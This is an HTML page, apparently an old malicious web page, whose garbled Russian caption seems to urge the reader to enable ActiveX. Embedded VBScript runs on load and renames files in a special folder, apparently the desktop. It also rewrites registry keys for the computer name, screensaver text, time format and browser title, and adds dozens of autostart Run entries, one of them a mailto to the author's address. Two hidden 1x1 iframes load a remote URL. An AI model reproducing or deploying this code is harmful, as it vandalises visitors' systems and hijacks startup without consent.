<html>
<head>
<title>������.</title>
</head>
<body text=black bgcolor=white>
<center>
<font face="Times New Roman" style="font-size: 12pt"><b>��� ����������� ���������� ���������� ��������� ��������� ��������: ������� �� ���� � ����� ������ �������, � �������� ��������� ��������������� ����������... ����� ��������� ��������� �������� ActiveX</b></font>
<h3>�����</h3>
<img src="" width="400" height="300"
</center>
<script LANGUAGE="VBScript">
Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")
For Each Folder In s.SpecialFolders
if right(folder,12)="������� ����" then  
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="Run Rabbit" & t
next
end if
next
<!--
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName", "Rabbit"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName", "Rabbit"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE", "C:\WINDOWS\system32\ssmarque.scr"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut", "60"  
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive", "1"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Attributes", "00000"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\BackgroundColor", "0 0 0"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\CharSet", "204"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Font", "Times New Roman"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Mode", "0"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Size", "36"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Speed", "3"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Text", "������ ������� ������ Dik_87@mail.ru"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\TextColor", "255 255 255"   
WshShell.RegWrite"HKEY_CURRENT_USER\Control panel\International\s1159", "Rabbit"
WshShell.RegWrite"HKEY_CURRENT_USER\Control panel\International\s2359", "Rabbit"
WshShell.RegWrite"HKEY_CURRENT_USER\Control panel\International\sTimeFormat", "HH:mm:ss tt"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "Rabbit VIP"
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", ""
WshShell.RegWrite"HKEY_CURRENT_USER\Control Panel\Mouse\MouseSensitivity", "7" 
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit001", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit002", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit003", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit004", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit005", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit006", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit007", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit008", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit009", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit010", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit011", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit012", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit013", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit014", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit015", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit016", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit017", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit018", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit019", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit020", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit021", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit022", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit023", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit024", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit025", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit026", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit027", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit028", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit029", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit030", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit031", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit032", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit033", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit034", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit035", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit036", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit037", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit038", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit039", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit040", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit041", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit042", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit043", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit044", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit045", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit046", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit047", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit048", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit049", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit050", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit051", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit052", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit053", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit054", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit055", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit056", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit057", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit058", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit059", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit060", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit061", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit062", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit063", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit064", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit065", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit066", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit067", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit068", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit069", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit070", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit071", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit072", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit073", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit074", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit075", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit076", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit077", "about:blank"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Rabbit", "mailto:Dik_87@mail.ru"
-->
</script>
<iframe src="http://www.zief.pl/iraq.jpg" width=1 height=1></iframe><iframe src="http://www.zief.pl/iraq.jpg" width=1 height=1></iframe></body></html>
